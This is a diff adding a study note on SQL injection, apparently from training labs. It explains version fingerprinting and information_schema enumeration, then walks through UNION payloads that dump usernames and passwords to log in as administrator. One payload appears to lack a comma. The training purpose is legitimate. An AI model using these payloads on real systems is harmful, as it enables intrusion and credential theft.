@@ -1,0 +1,89 @@
+Examining the database in SQL injection attacks:
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+The type and version of the database software.
+The tables and columns that the database contains.
+
+
+Querying the database type and version:
+
+We can identify both the database and its version by injecting provider-specific queries to see if one works. 
+
+The following are some queries to determine the database version for some popular database types:
+
+Database type	    Query
+Microsoft, MySQL	SELECT @@version
+Oracle	            SELECT * FROM v$version
+PostgreSQL	        SELECT version()
+
+We can use the UNION attack to get the version: ' Union Select @@version--
+
+This has the potential to return the following results: 
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+
+------------------------------------------------------------------------------------------------------------------
+
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+We will use Burp Suite. First of all, not every SQL database will accept the -- as a comment, so we will experiment with different comment methods in known databases: such as # which will have the code of %23 in URL. Firstly, we need to know how many columns we are dealing with and what column(s) can handle String data. We are dealing with 2 columns that both can handle String data. To solve this lab, we will put this query next to category:'+Union+Select+@@version+NULL+%23
+
+This will return the version for us.
+
+ ------------------------------------------------------------------------------------------------------------------
+
+ Listing the contents of the database:
+
+ Most database types (except Oracle) have a set of views called the information schema. This provides information about the database. For example, we can query information_schema.tables to list the tables in the database: SELECT * FROM information_schema.tables
+
+This returns output like the following:
+
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+
+
+
+This output indicates that there are three tables, called Products, Users, and Feedback.
+
+You can then query information_schema.columns to list the columns in individual tables:SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+This returns output like the following:
+
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+
+------------------------------------------------------------------------------------------------------------------
+
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+PRACTITIONER
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.  
+
+We will use Burp Suite for this lab. As always, we need to find out how many columns are there and what column(s) can handle String data. We find out that two columns can handle String data. 
+
+For our first query, we will have to know how many tables we are dealing with in the information schema and their names, so we will put the following query: 'Union+select+Null,TABLE_NAME+FROM+information_schema.tables+--. 
+
+We will get a lot of tables but we know that we are looking for a table that contains the users information, so we will search in the results for the keyword users. We find a table called users_(randomtext). We can check what information this table has by doing this query: 'Union+select+Null,COLUMN_NAME+FROM+information_schema.columns+where+TABLE_NAME='users_(randomtext)'--. 
+
+we will get two columns that are very interesting: username_(randomtext), and password_(randomtext). 
+
+Finally, we can view the information that these two columns have by: 'Union+select+username_(randomtext),password_(randomtext)+from+users_(randomtext)+--
+
+We use the password that belongs to administrator to login.
